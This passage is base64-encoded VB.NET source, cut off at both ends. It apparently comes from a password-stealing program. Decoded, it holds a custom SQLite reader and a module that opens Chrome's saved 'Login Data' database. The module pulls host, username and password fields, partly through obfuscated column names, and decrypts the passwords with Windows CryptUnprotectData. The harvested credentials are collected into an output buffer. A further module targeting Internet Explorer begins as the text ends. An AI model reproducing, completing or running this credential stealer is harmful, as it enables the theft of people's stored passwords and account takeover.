sZF9TaXplKDApICsgRmllbGRfU2l6ZSgxKSArIEZpZWxkX1NpemUoMikgKyBGaWVsZF9TaXplKDMpLCBGaWVsZF9TaXplKDQpKQ0KICAgICAgICAgICAgICAgIEVsc2VJZiBlbmNvZGluZyA9IDIgVGhlbg0KICAgICAgICAgICAgICAgICAgICBtYXN0ZXJfdGFibGVfZW50cmllcyhvbCArIGkpLnNxbF9zdGF0ZW1lbnQgPSBTeXN0ZW0uVGV4dC5FbmNvZGluZy5Vbmljb2RlLkdldFN0cmluZyhkYl9ieXRlcywgZW50X29mZnNldCArIFJlY19IZWFkZXJfU2l6ZSArIEZpZWxkX1NpemUoMCkgKyBGaWVsZF9TaXplKDEpICsgRmllbGRfU2l6ZSgyKSArIEZpZWxkX1NpemUoMyksIEZpZWxkX1NpemUoNCkpDQogICAgICAgICAgICAgICAgRWxzZUlmIGVuY29kaW5nID0gMyBUaGVuDQogICAgICAgICAgICAgICAgICAgIG1hc3Rlcl90YWJsZV9lbnRyaWVzKG9sICsgaSkuc3FsX3N0YXRlbWVudCA9IFN5c3RlbS5UZXh0LkVuY29kaW5nLkJpZ0VuZGlhblVuaWNvZGUuR2V0U3RyaW5nKGRiX2J5dGVzLCBlbnRfb2Zmc2V0ICsgUmVjX0hlYWRlcl9TaXplICsgRmllbGRfU2l6ZSgwKSArIEZpZWxkX1NpemUoMSkgKyBGaWVsZF9TaXplKDIpICsgRmllbGRfU2l6ZSgzKSwgRmllbGRfU2l6ZSg0KSkNCiAgICAgICAgICAgICAgICBFbmQgSWYNCiAgICAgICAgICAgIE5leHQNCiAgICAgICAgRWxzZUlmIGRiX2J5dGVzKE9mZnNldCkgPSAmSDUgVGhlbg0KICAgICAgICAgICAgRGltIExlbmd0aCBBcyBVSW50MTYgPSBDb252ZXJ0VG9JbnRlZ2VyKE9mZnNldCArIDMsIDIpIC0gMQ0KICAgICAgICAgICAgRGltIGVudF9vZmZzZXQgQXMgVUludDE2DQoNCiAgICAgICAgICAgIEZvciBpIGFzIGludGVnZXIgPSAwIFRvIExlbmd0aCBTdGVwIDENCiAgICAgICAgICAgICAgICBlbnRfb2Zmc2V0ID0gQ29udmVydFRvSW50ZWdlcihPZmZzZXQgKyAxMiArIChpICogMiksIDIpDQoNCiAgICAgICAgICAgICAgICBJZiBPZmZzZXQgPSAxMDAgVGhlbg0KICAgICAgICAgICAgICAgICAgICBSZWFkTWFzdGVyVGFibGUoKENvbnZlcnRUb0ludGVnZXIoZW50X29mZnNldCwgNCkgLSAxKSAqIHBhZ2Vfc2l6ZSkNCiAgICAgICAgICAgICAgICBFbHNlDQogICAgICAgICAgICAgICAgICAgIFJlYWRNYXN0ZXJUYWJsZSgoQ29udmVydFRvSW50ZWdlcihPZmZzZXQgKyBlbnRfb2Zmc2V0LCA0KSAtIDEpICogcGFnZV9zaXplKQ0KICAgICAgICAgICAgICAgIEVuZCBJZg0KDQogICAgICAgICAgICBOZXh0DQoNCiAgICAgICAgICAgIFJlYWRNYXN0ZXJUYWJsZSgoQ29udmVydFRvSW50ZWdlcihPZmZzZXQgKyA4LCA0KSAtIDEpICogcGFnZV9zaXplKQ0KICAgICAgICBFbmQgSWYNCiAgICBFbmQgU3ViDQoNCiAgICBQcml2YXRlIEZ1bmN0aW9uIFJlYWRUYWJsZUZyb21PZmZzZXQoQnlWYWwgT2Zmc2V0IEFzIFVJbnQ2NCkgQXMgQm9vbGVhbg0KICAgICAgICBJZiBkYl9ieXRlcyhPZmZzZXQpID0gJkhEIFRoZW4NCg0KDQogICAgICAgICAgICBEaW0gTGVuZ3RoIEFzIFVJbnQxNiA9IENvbnZlcnRUb0ludGVnZXIoT2Zmc2V0ICsgMywgMikgLSAxDQogICAgICAgICAgICBEaW0gb2wgQXMgSW50ZWdlciA9IDANCg0KICAgICAgICAgICAgSWYgTm90IHRhYmxlX2VudHJpZXMgSXMgTm90aGluZyBUaGVuDQogICAgICAgICAgICAgICAgb2wgPSB0YWJsZV9lbnRyaWVzLkxlbmd0aA0KICAgICAgICAgICAgICAgIFJlRGltIFByZXNlcnZlIHRhYmxlX2VudHJpZXModGFibGVfZW50cmllcy5MZW5ndGggKyBMZW5ndGgpDQogICAgICAgICAgICBFbHNlDQogICAgICAgICAgICAgICAgUmVEaW0gdGFibGVfZW50cmllcyhMZW5ndGgpDQogICAgICAgICAgICBFbmQgSWYNCg0KICAgICAgICAgICAgRGltIGVudF9vZmZzZXQgQXMgVUludDY0DQoNCiAgICAgICAgICAgIEZvciBpIGFzIGludGVnZXIgPSAwIFRvIExlbmd0aCBTdGVwIDENCiAgICAgICAgICAgICAgICBlbnRfb2Zmc2V0ID0gQ29udmVydFRvSW50ZWdlcihPZmZzZXQgKyA4ICsgKGkgKiAyKSwgMikNCg0KICAgICAgICAgICAgICAgIElmIE9mZnNldCA8PiAxMDAgVGhlbiBlbnRfb2Zmc2V0ID0gZW50X29mZnNldCArIE9mZnNldA0KDQogICAgICAgICAgICAgICAgJw0KICAgICAgICAgICAgICAgIERpbSB0ID0gR1ZMKGVudF9vZmZzZXQpDQogICAgICAgICAgICAgICAgRGltIHNpemUgQXMgSW50NjQgPSBDVkwoZW50X29mZnNldCwgdCkNCg0KICAgICAgICAgICAgICAgIERpbSBzID0gR1ZMKGVudF9vZmZzZXQgKyAodCAtIGVudF9vZmZzZXQpICsgMSkNCiAgICAgICAgICAgICAgICB0YWJsZV9lbnRyaWVzKG9sICsgaSkucm93X2lkID0gQ1ZMKGVudF9vZmZzZXQgKyAodCAtIGVudF9vZmZzZXQpICsgMSwgcykNCg0KDQogICAgICAgICAgICAgICAgZW50X29mZnNldCA9IGVudF9vZmZzZXQgKyAocyAtIGVudF9vZmZzZXQpICsgMQ0KDQoNCiAgICAgICAgICAgICAgICB0ID0gR1ZMKGVudF9vZmZzZXQpDQogICAgICAgICAgICAgICAgcyA9IHQNCiAgICAgICAgICAgICAgICBEaW0gUmVjX0hlYWRlcl9TaXplIEFzIEludDY0ID0gQ1ZMKGVudF9vZmZzZXQsIHQpDQoNCiAgICAgICAgICAgICAgICBEaW0gRmllbGRfU2l6ZSgpIEFzIHJlY29yZF9oZWFkZXJfZmllbGQgPSBub3RoaW5nDQogICAgICAgICAgICAgICAgRGltIHNpemVfcmVhZCBBcyBJbnQ2NCA9IChlbnRfb2Zmc2V0IC0gdCkgKyAxDQogICAgICAgICAgICAgICAgRGltIGogPSAwDQoNCg0KICAgICAgICAgICAgICAgIFdoaWxlIHNpemVfcmVhZCA8IFJlY19IZWFkZXJfU2l6ZQ0KICAgICAgICAgICAgICAgICAgICBSZURpbSBQcmVzZXJ2ZSBGaWVsZF9TaXplKGopDQoNCiAgICAgICAgICAgICAgICAgICAgdCA9IHMgKyAxDQogICAgICAgICAgICAgICAgICAgIHMgPSBHVkwodCkNCiAgICAgICAgICAgICAgICAgICAgRmllbGRfU2l6ZShqKS50eXBlID0gQ1ZMKHQsIHMpDQoNCiAgICAgICAgICAgICAgICAgICAgSWYgRmllbGRfU2l6ZShqKS50eXBlID4gOSBUaGVuDQogICAgICAgICAgICAgICAgICAgICAgICBJZiBJc09kZChGaWVsZF9TaXplKGopLnR5cGUpIFRoZW4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBGaWVsZF9TaXplKGopLnNpemUgPSAoRmllbGRfU2l6ZShqKS50eXBlIC0gMTMpIC8gMg0KICAgICAgICAgICAgICAgICAgICAgICAgRWxzZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIEZpZWxkX1NpemUoaikuc2l6ZSA9IChGaWVsZF9TaXplKGopLnR5cGUgLSAxMikgLyAyDQogICAgICAgICAgICAgICAgICAgICAgICBFbmQgSWYNCiAgICAgICAgICAgICAgICAgICAgRWxzZQ0KICAgICAgICAgICAgICAgICAgICAgICAgRmllbGRfU2l6ZShqKS5zaXplID0gU1FMRGF0YVR5cGVTaXplKEZpZWxkX1NpemUoaikudHlwZSkNCiAgICAgICAgICAgICAgICAgICAgRW5kIElmDQoNCiAgICAgICAgICAgICAgICAgICAgc2l6ZV9yZWFkID0gc2l6ZV9yZWFkICsgKHMgLSB0KSArIDENCiAgICAgICAgICAgICAgICAgICAgaiA9IGogKyAxDQogICAgICAgICAgICAgICAgRW5kIFdoaWxlDQoNCiAgICAgICAgICAgICAgICBSZURpbSB0YWJsZV9lbnRyaWVzKG9sICsgaSkuY29udGVudChGaWVsZF9TaXplLkxlbmd0aCAtIDEpDQogICAgICAgICAgICAgICAgRGltIGNvdW50ZXIgQXMgSW50ZWdlciA9IDANCg0KICAgICAgICAgICAgICAgIEZvciBrIGFzIGludGVnZXIgPSAwIFRvIEZpZWxkX1NpemUuTGVuZ3RoIC0gMSBTdGVwIDENCiAgICAgICAgICAgICAgICAgICAgSWYgRmllbGRfU2l6ZShrKS50eXBlID4gOSBUaGVuDQogICAgICAgICAgICAgICAgICAgICAgICBJZiBOb3QgSXNPZGQoRmllbGRfU2l6ZShrKS50eXBlKSBUaGVuDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgSWYgZW5jb2RpbmcgPSAxIFRoZW4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFibGVfZW50cmllcyhvbCArIGkpLmNvbnRlbnQoaykgPSBTeXN0ZW0uVGV4dC5FbmNvZGluZy5EZWZhdWx0LkdldFN0cmluZyhkYl9ieXRlcywgZW50X29mZnNldCArIFJlY19IZWFkZXJfU2l6ZSArIGNvdW50ZXIsIEZpZWxkX1NpemUoaykuc2l6ZSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBFbHNlSWYgZW5jb2RpbmcgPSAyIFRoZW4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFibGVfZW50cmllcyhvbCArIGkpLmNvbnRlbnQoaykgPSBTeXN0ZW0uVGV4dC5FbmNvZGluZy5Vbmljb2RlLkdldFN0cmluZyhkYl9ieXRlcywgZW50X29mZnNldCArIFJlY19IZWFkZXJfU2l6ZSArIGNvdW50ZXIsIEZpZWxkX1NpemUoaykuc2l6ZSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBFbHNlSWYgZW5jb2RpbmcgPSAzIFRoZW4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFibGVfZW50cmllcyhvbCArIGkpLmNvbnRlbnQoaykgPSBTeXN0ZW0uVGV4dC5FbmNvZGluZy5CaWdFbmRpYW5Vbmljb2RlLkdldFN0cmluZyhkYl9ieXRlcywgZW50X29mZnNldCArIFJlY19IZWFkZXJfU2l6ZSArIGNvdW50ZXIsIEZpZWxkX1NpemUoaykuc2l6ZSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBFbmQgSWYNCiAgICAgICAgICAgICAgICAgICAgICAgIEVsc2UNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YWJsZV9lbnRyaWVzKG9sICsgaSkuY29udGVudChrKSA9IFN5c3RlbS5UZXh0LkVuY29kaW5nLkRlZmF1bHQuR2V0U3RyaW5nKGRiX2J5dGVzLCBlbnRfb2Zmc2V0ICsgUmVjX0hlYWRlcl9TaXplICsgY291bnRlciwgRmllbGRfU2l6ZShrKS5zaXplKQ0KICAgICAgICAgICAgICAgICAgICAgICAgRW5kIElmDQogICAgICAgICAgICAgICAgICAgIEVsc2UNCiAgICAgICAgICAgICAgICAgICAgICAgIHRhYmxlX2VudHJpZXMob2wgKyBpKS5jb250ZW50KGspID0gQ1N0cihDb252ZXJ0VG9JbnRlZ2VyKGVudF9vZmZzZXQgKyBSZWNfSGVhZGVyX1NpemUgKyBjb3VudGVyLCBGaWVsZF9TaXplKGspLnNpemUpKQ0KICAgICAgICAgICAgICAgICAgICBFbmQgSWYNCg0KICAgICAgICAgICAgICAgICAgICBjb3VudGVyID0gY291bnRlciArIEZpZWxkX1NpemUoaykuc2l6ZQ0KICAgICAgICAgICAgICAgIE5leHQNCiAgICAgICAgICAgIE5leHQNCiAgICAgICAgRWxzZUlmIGRiX2J5dGVzKE9mZnNldCkgPSAmSDUgVGhlbiAnaW50ZXJuYWwgbm9kZQ0KICAgICAgICAgICAgRGltIExlbmd0aCBBcyBVSW50MTYgPSBDb252ZXJ0VG9JbnRlZ2VyKE9mZnNldCArIDMsIDIpIC0gMQ0KICAgICAgICAgICAgRGltIGVudF9vZmZzZXQgQXMgVUludDE2DQoNCiAgICAgICAgICAgIEZvciBpIGFzIGludGVnZXIgPSAwIFRvIExlbmd0aCBTdGVwIDENCiAgICAgICAgICAgICAgICBlbnRfb2Zmc2V0ID0gQ29udmVydFRvSW50ZWdlcihPZmZzZXQgKyAxMiArIChpICogMiksIDIpDQoNCiAgICAgICAgICAgICAgICBSZWFkVGFibGVGcm9tT2Zmc2V0KChDb252ZXJ0VG9JbnRlZ2VyKE9mZnNldCArIGVudF9vZmZzZXQsIDQpIC0gMSkgKiBwYWdlX3NpemUpDQogICAgICAgICAgICBOZXh0DQoNCiAgICAgICAgICAgIFJlYWRUYWJsZUZyb21PZmZzZXQoKENvbnZlcnRUb0ludGVnZXIoT2Zmc2V0ICsgOCwgNCkgLSAxKSAqIHBhZ2Vfc2l6ZSkNCiAgICAgICAgRW5kIElmDQoNCiAgICAgICAgUmV0dXJuIFRydWUNCiAgICBFbmQgRnVuY3Rpb24NCg0KDQogICAgUHVibGljIEZ1bmN0aW9uIFJlYWRUYWJsZShCeVZhbCBUYWJsZU5hbWUgQXMgU3RyaW5nKSBBcyBCb29sZWFuDQogICAgICAgICcNCiAgICAgICAgRGltIGZvdW5kIEFzIEludGVnZXIgPSAtMQ0KDQogICAgICAgIEZvciBpIGFzIGludGVnZXIgPSAwIFRvIG1hc3Rlcl90YWJsZV9lbnRyaWVzLkxlbmd0aCBTdGVwIDENCiAgICAgICAgICAgIElmIG1hc3Rlcl90YWJsZV9lbnRyaWVzKGkpLml0ZW1fbmFtZS5Ub0xvd2VyKCkuQ29tcGFyZVRvKFRhYmxlTmFtZS5Ub0xvd2VyKCkpID0gMCBUaGVuDQogICAgICAgICAgICAgICAgZm91bmQgPSBpDQogICAgICAgICAgICAgICAgRXhpdCBGb3INCiAgICAgICAgICAgIEVuZCBJZg0KICAgICAgICBOZXh0DQoNCiAgICAgICAgSWYgZm91bmQgPSAtMSBUaGVuIFJldHVybiBGYWxzZQ0KDQogICAgICAgIERpbSBmaWVsZHMoKSA9IG1hc3Rlcl90YWJsZV9lbnRyaWVzKGZvdW5kKS5zcWxfc3RhdGVtZW50LlN1YnN0cmluZyhtYXN0ZXJfdGFibGVfZW50cmllcyhmb3VuZCkuc3FsX3N0YXRlbWVudC5JbmRleE9mKCIoIikgKyAxKS5TcGxpdCgiLCIpDQoNCiAgICAgICAgRm9yIGkgYXMgaW50ZWdlciA9IDAgVG8gZmllbGRzLkxlbmd0aCAtIDEgU3RlcCAxDQogICAgICAgICAgICBmaWVsZHMoaSkgPSBMVHJpbShmaWVsZHMoaSkpDQoNCiAgICAgICAgICAgIERpbSBpbmRleCA9IGZpZWxkcyhpKS5JbmRleE9mKCIgIikNCg0KICAgICAgICAgICAgSWYgaW5kZXggPiAwIFRoZW4gZmllbGRzKGkpID0gZmllbGRzKGkpLlN1YnN0cmluZygwLCBpbmRleCkNCg0KICAgICAgICAgICAgSWYgZmllbGRzKGkpLkluZGV4T2YoIlVOSVFVRSIpID0gMCBUaGVuDQogICAgICAgICAgICAgICAgRXhpdCBGb3INCiAgICAgICAgICAgIEVsc2UNCiAgICAgICAgICAgICAgICBSZURpbSBQcmVzZXJ2ZSBmaWVsZF9uYW1lcyhpKQ0KICAgICAgICAgICAgICAgIGZpZWxkX25hbWVzKGkpID0gZmllbGRzKGkpDQogICAgICAgICAgICBFbmQgSWYNCiAgICAgICAgTmV4dA0KDQogICAgICAgIFJldHVybiBSZWFkVGFibGVGcm9tT2Zmc2V0KChtYXN0ZXJfdGFibGVfZW50cmllcyhmb3VuZCkucm9vdF9udW0gLSAxKSAqIHBhZ2Vfc2l6ZSkNCiAgICBFbmQgRnVuY3Rpb24NCg0KDQogICAgUHVibGljIEZ1bmN0aW9uIEdldFJvd0NvdW50KCkgQXMgSW50ZWdlcg0KICAgICAgICBSZXR1cm4gdGFibGVfZW50cmllcy5MZW5ndGgNCiAgICBFbmQgRnVuY3Rpb24NCg0KDQogICAgUHVibGljIEZ1bmN0aW9uIEdldFZhbHVlKEJ5VmFsIHJvd19udW0gQXMgSW50ZWdlciwgQnlWYWwgZmllbGQgQXMgSW50ZWdlcikgQXMgU3RyaW5nDQogICAgICAgIElmIHJvd19udW0gPj0gdGFibGVfZW50cmllcy5MZW5ndGggVGhlbiBSZXR1cm4gTm90aGluZw0KICAgICAgICBJZiBmaWVsZCA+PSB0YWJsZV9lbnRyaWVzKHJvd19udW0pLmNvbnRlbnQuTGVuZ3RoIFRoZW4gUmV0dXJuIE5vdGhpbmcNCg0KICAgICAgICBSZXR1cm4gdGFibGVfZW50cmllcyhyb3dfbnVtKS5jb250ZW50KGZpZWxkKQ0KICAgIEVuZCBGdW5jdGlvbg0KDQoNCiAgICBQdWJsaWMgRnVuY3Rpb24gR2V0VmFsdWUoQnlWYWwgcm93X251bSBBcyBJbnRlZ2VyLCBCeVZhbCBmaWVsZCBBcyBTdHJpbmcpIEFzIFN0cmluZw0KICAgICAgICBEaW0gZm91bmQgQXMgSW50ZWdlciA9IC0xDQoNCiAgICAgICAgRm9yIGkgYXMgaW50ZWdlciA9IDAgVG8gZmllbGRfbmFtZXMuTGVuZ3RoIFN0ZXAgMQ0KICAgICAgICAgICAgSWYgZmllbGRfbmFtZXMoaSkuVG9Mb3dlcigpLkNvbXBhcmVUbyhmaWVsZC5Ub0xvd2VyKCkpID0gMCBUaGVuDQogICAgICAgICAgICAgICAgZm91bmQgPSBpDQogICAgICAgICAgICAgICAgRXhpdCBGb3INCiAgICAgICAgICAgIEVuZCBJZg0KICAgICAgICBOZXh0DQoNCiAgICAgICAgSWYgZm91bmQgPSAtMSBUaGVuIFJldHVybiBOb3RoaW5nDQoNCiAgICAgICAgUmV0dXJuIEdldFZhbHVlKHJvd19udW0sIGZvdW5kKQ0KICAgIEVuZCBGdW5jdGlvbg0KDQoNCiAgICBQdWJsaWMgRnVuY3Rpb24gR2V0VGFibGVOYW1lcygpIEFzIFN0cmluZygpDQogICAgICAgIERpbSByZXRWYWwgQXMgU3RyaW5nKCkgPSBub3RoaW5nDQogICAgICAgIERpbSBhcnIgPSAwDQoNCiAgICAgICAgRm9yIGkgYXMgaW50ZWdlciA9IDAgVG8gbWFzdGVyX3RhYmxlX2VudHJpZXMuTGVuZ3RoIC0gMSBTdGVwIDENCiAgICAgICAgICAgIElmIG1hc3Rlcl90YWJsZV9lbnRyaWVzKGkpLml0ZW1fdHlwZSA9ICJ0YWJsZSIgVGhlbg0KICAgICAgICAgICAgICAgIFJlRGltIFByZXNlcnZlIHJldFZhbChhcnIpDQogICAgICAgICAgICAgICAgcmV0VmFsKGFycikgPSBtYXN0ZXJfdGFibGVfZW50cmllcyhpKS5pdGVtX25hbWUNCiAgICAgICAgICAgICAgICBhcnIgPSBhcnIgKyAxDQogICAgICAgICAgICBFbmQgSWYNCiAgICAgICAgTmV4dA0KDQogICAgICAgIFJldHVybiByZXRWYWwNCg0KICAgIEVuZCBGdW5jdGlvbg0KDQogICAgJyBDb25zdHJ1Y3Rvcg0KICAgIFB1YmxpYyBTdWIgTmV3KEJ5VmFsIGJhc2VOYW1lIEFzIFN0cmluZykNCg0KICAgICAgICBJZiBGaWxlLkV4aXN0cyhiYXNlTmFtZSkgVGhlbg0KICAgICAgICAgICAgRmlsZU9wZW4oMSwgYmFzZU5hbWUsIE9wZW5Nb2RlLkJpbmFyeSwgT3BlbkFjY2Vzcy5SZWFkLCBPcGVuU2hhcmUuU2hhcmVkKQ0KICAgICAgICAgICAgRGltIGFzaSBBcyBTdHJpbmcgPSBTcGFjZShMT0YoMSkpDQogICAgICAgICAgICBGaWxlR2V0KDEsIGFzaSkNCiAgICAgICAgICAgIEZpbGVDbG9zZSgxKQ0KDQogICAgICAgICAgICBkYl9ieXRlcyA9IFN5c3RlbS5UZXh0LkVuY29kaW5nLkRlZmF1bHQuR2V0Qnl0ZXMoYXNpKQ0KDQogICAgICAgICAgICBJZiBTeXN0ZW0uVGV4dC5FbmNvZGluZy5EZWZhdWx0LkdldFN0cmluZyhkYl9ieXRlcywgMCwgMTUpLkNvbXBhcmVUbygiU1FMaXRlIGZvcm1hdCAzIikgPD4gMCBUaGVuDQogICAgICAgICAgICAgICAgVGhyb3cgTmV3IEV4Y2VwdGlvbigiTm90IGEgdmFsaWQgU1FMaXRlIDMgRGF0YWJhc2UgRmlsZSIpDQogICAgICAgICAgICAgICAgRW5kDQogICAgICAgICAgICBFbmQgSWYNCg0KICAgICAgICAgICAgSWYgZGJfYnl0ZXMoNTIpIDw+IDAgVGhlbg0KICAgICAgICAgICAgICAgIFRocm93IE5ldyBFeGNlcHRpb24oIkF1dG8tdmFjdXVtIGNhcGFibGUgZGF0YWJhc2UgaXMgbm90IHN1cHBvcnRlZCIpDQogICAgICAgICAgICAgICAgRW5kDQogICAgICAgICAgICBFbHNlSWYgQ29udmVydFRvSW50ZWdlcig0NCwgNCkgPj0gNCBUaGVuDQogICAgICAgICAgICAgICAgVGhyb3cgTmV3IEV4Y2VwdGlvbigiTm8gc3VwcG9ydGVkIFNjaGVtYSBsYXllciBmaWxlLWZvcm1hdCIpDQogICAgICAgICAgICAgICAgRW5kDQogICAgICAgICAgICBFbmQgSWYNCg0KICAgICAgICAgICAgcGFnZV9zaXplID0gQ29udmVydFRvSW50ZWdlcigxNiwgMikNCiAgICAgICAgICAgIGVuY29kaW5nID0gQ29udmVydFRvSW50ZWdlcig1NiwgNCkNCg0KICAgICAgICAgICAgSWYgZW5jb2RpbmcgPSAwIFRoZW4gZW5jb2RpbmcgPSAxDQoNCiAgICAgICAgICAgICdOb3cgd2UgcmVhZCB0aGUgc3FsaXRlX21hc3RlciB0YWJsZQ0KICAgICAgICAgICAgJ09mZnNldCBpcyAxMDAgaW4gZmlyc3QgcGFnZQ0KICAgICAgICAgICAgUmVhZE1hc3RlclRhYmxlKDEwMCkNCiAgICAgICAgRW5kIElmDQogICAgRW5kIFN1Yg0KRW5kIENsYXNzDQpNb2R1bGUgQ2hyb21lDQoNCiAgICBQdWJsaWMgY1Bhc3MgQXMgU3RyaW5nDQogICAgUHVibGljIFN1YiBHZXRDaHJvbWUoKQ0KICAgICAgICBUcnkNCgkgICBEaW0gZGF0YXBhdGggQXMgU3RyaW5nID0gRW52aXJvbm1lbnQuR2V0Rm9sZGVyUGF0aChFbnZpcm9ubWVudC5TcGVjaWFsRm9sZGVyLkxvY2FsQXBwbGljYXRpb25EYXRhKSArICJcR29vZ2xlXENocm9tZVxVc2VyIERhdGFcRGVmYXVsdFxMb2dpbiBEYXRhIg0KDQogICAgICAgDQogICAgICAgICAgICBEaW0gU1FMRGF0YWJhc2UgPSBOZXcgU1FMaXRlSGFuZGxlcihkYXRhcGF0aCkNCiAgICAgICAgICAgIFNRTERhdGFiYXNlLlJlYWRUYWJsZSgibG9naW5zIikNCg0KICAgICAgICAgICAgSWYgRmlsZS5FeGlzdHMoZGF0YXBhdGgpIFRoZW4NCg0KICAgICAgICAgICAgICAgIERpbSBob3N0LCB1c2VyLCBwYXNzIEFzIFN0cmluZw0KDQogICAgICAgICAgICAgICAgRm9yIGkgYXMgaW50ZWdlciA9IDAgVG8gU1FMRGF0YWJhc2UuR2V0Um93Q291bnQoKSAtIDEgU3RlcCAxDQogICAgICAgICAgICAgICAgICAgIGhvc3QgPSBTUUxEYXRhYmFzZS5HZXRWYWx1ZShpLCBbMjRdLls0Ml0oImIzSnBaMmx1WDNWeWJBPT0iKSkNCiAgICAgICAgICAgICAgICAgICAgdXNlciA9IFNRTERhdGFiYXNlLkdldFZhbHVlKGksIFsyNF0uWzQyXSgiZFhObGNtNWhiV1ZmZG1Gc2RXVT0iKSkNCiAgICAgICAgICAgICAgICAgICAgcGFzcyA9IERlY3J5cHQoU3lzdGVtLlRleHQuRW5jb2RpbmcuRGVmYXVsdC5HZXRCeXRlcyhTUUxEYXRhYmFzZS5HZXRWYWx1ZShpLCAicGFzc3dvcmRfdmFsdWUiKSkpDQoNCiAgICAgICAgICAgICAgICAgICAgSWYgKHVzZXIgPD4gIiIpIEFuZCAocGFzcyA8PiAiIikgVGhlbg0KICAgICAgICAgICAgICAgICAgICAgICAgY1Bhc3MgPSAoIn5+fn5+Q2hyb21lfn5+fn4iICYgdmJOZXdMaW5lICYgIkhvc3Q6ICIgJiBob3N0ICYgdmJOZXdMaW5lICYgIlVzZXJuYW1lOiAiICYgdXNlciAmIHZiTmV3TGluZSAmICJQYXNzd29yZDogIiAmIHBhc3MgJiB2Yk5ld0xpbmUgJiAifn5+fn5+fn5+fiIgXw0KICAgICAgICAgICAgICAgICAgICAgICAgJiB2Yk5ld0xpbmUgJiAiICIpDQogICAgICAgICAgICAgICAgICAgICAgICBbMjRdLls4OF0uQXBwZW5kVGV4dChjUGFzcykNCiAgICAgICAgICAgICAgICAgICAgRW5kIElmDQogICAgICAgICAgICAgICAgTmV4dA0KDQogICAgICAgICAgICBFbmQgSWYNCiAgICAgICAgQ2F0Y2ggZXggQXMgRXhjZXB0aW9uDQogICAgICAgICAgICANCiAgICAgICAgRW5kIFRyeQ0KICAgIEVuZCBTdWINCiAgICA8RGxsSW1wb3J0KCJDcnlwdDMyLmRsbCIsIFNldExhc3RFcnJvcjo9VHJ1ZSwgQ2hhclNldDo9U3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkNoYXJTZXQuQXV0byk+IF8NCiAgICBQcml2YXRlIEZ1bmN0aW9uIENyeXB0VW5wcm90ZWN0RGF0YShCeVJlZiBwRGF0YUluIEFzIERBVEFfQkxPQiwgQnlWYWwgc3pEYXRhRGVzY3IgQXMgU3RyaW5nLCBCeVJlZiBwT3B0aW9uYWxFbnRyb3B5IEFzIERBVEFfQkxPQiwgQnlWYWwgcHZSZXNlcnZlZCBBcyBJbnRQdHIsIEJ5UmVmIHBQcm9tcHRTdHJ1Y3QgQXMgQ1JZUFRQUk9URUNUX1BST01QVFNUUlVDVCwgQnlWYWwgZHdGbGFncyBBcyBJbnRlZ2VyLCBCeVJlZiBwRGF0YU91dCBBcyBEQVRBX0JMT0IpIEFzIEJvb2xlYW4NCiAgICBFbmQgRnVuY3Rpb24NCiAgICA8RmxhZ3MoKT4gRW51bSBDcnlwdFByb3RlY3RQcm9tcHRGbGFncw0KICAgICAgICBDUllQVFBST1RFQ1RfUFJPTVBUX09OX1VOUFJPVEVDVCA9ICZIMQ0KICAgICAgICBDUllQVFBST1RFQ1RfUFJPTVBUX09OX1BST1RFQ1QgPSAmSDINCiAgICBFbmQgRW51bQ0KICAgIDxTdHJ1Y3RMYXlvdXQoTGF5b3V0S2luZC5TZXF1ZW50aWFsLCBDaGFyU2V0Oj1DaGFyU2V0LlVuaWNvZGUpPiBTdHJ1Y3R1cmUgQ1JZUFRQUk9URUNUX1BST01QVFNUUlVDVA0KICAgICAgICBQdWJsaWMgY2JTaXplIEFzIEludGVnZXINCiAgICAgICAgUHVibGljIGR3UHJvbXB0RmxhZ3MgQXMgQ3J5cHRQcm90ZWN0UHJvbXB0RmxhZ3MNCiAgICAgICAgUHVibGljIGh3bmRBcHAgQXMgSW50UHRyDQogICAgICAgIFB1YmxpYyBzelByb21wdCBBcyBTdHJpbmcNCiAgICBFbmQgU3RydWN0dXJlDQogICAgPFN0cnVjdExheW91dChMYXlvdXRLaW5kLlNlcXVlbnRpYWwsIENoYXJTZXQ6PUNoYXJTZXQuVW5pY29kZSk+IFN0cnVjdHVyZSBEQVRBX0JMT0INCiAgICAgICAgUHVibGljIGNiRGF0YSBBcyBJbnRlZ2VyDQogICAgICAgIFB1YmxpYyBwYkRhdGEgQXMgSW50UHRyDQogICAgRW5kIFN0cnVjdHVyZQ0KICAgIEZ1bmN0aW9uIERlY3J5cHQoQnlWYWwgRGF0YXMoKSBBcyBCeXRlKSBBcyBTdHJpbmcNCiAgICAgICAgRGltIGluaiwgT3JzIEFzIE5ldyBEQVRBX0JMT0INCiAgICAgICAgRGltIEdoYW5kbGUgQXMgR0NIYW5kbGUgPSBHQ0hhbmRsZS5BbGxvYyhEYXRhcywgR0NIYW5kbGVUeXBlLlBpbm5lZCkNCiAgICAgICAgaW5qLnBiRGF0YSA9IEdoYW5kbGUuQWRkck9mUGlubmVkT2JqZWN0KCkNCiAgICAgICAgaW5qLmNiRGF0YSA9IERhdGFzLkxlbmd0aA0KICAgICAgICBHaGFuZGxlLkZyZWUoKQ0KICAgICAgICBDcnlwdFVucHJvdGVjdERhdGEoaW5qLCBOb3RoaW5nLCBOb3RoaW5nLCBOb3RoaW5nLCBOb3RoaW5nLCAwLCBPcnMpDQogICAgICAgIERpbSBSZXR1cm5lZCgpIEFzIEJ5dGUgPSBOZXcgQnl0ZShPcnMuY2JEYXRhKSB7fQ0KICAgICAgICBNYXJzaGFsLkNvcHkoT3JzLnBiRGF0YSwgUmV0dXJuZWQsIDAsIE9ycy5jYkRhdGEpDQogICAgICAgIERpbSBUaGVTdHJpbmcgQXMgU3RyaW5nID0gRW5jb2RpbmcuRGVmYXVsdC5HZXRTdHJpbmcoUmV0dXJuZWQpDQogICAgICAgIFJldHVybiBUaGVTdHJpbmcuU3Vic3RyaW5nKDAsIFRoZVN0cmluZy5MZW5ndGggLSAxKQ0KICAgIEVuZCBGdW5jdGlvbg0KDQpFbmQgTW9kdWxlDQoNClB1YmxpYyBNb2R1bGUgSUU3OA0KICAgICcNCiAgICBQcml2YXRlIENvbnN0IEFMR19DTEFTU19I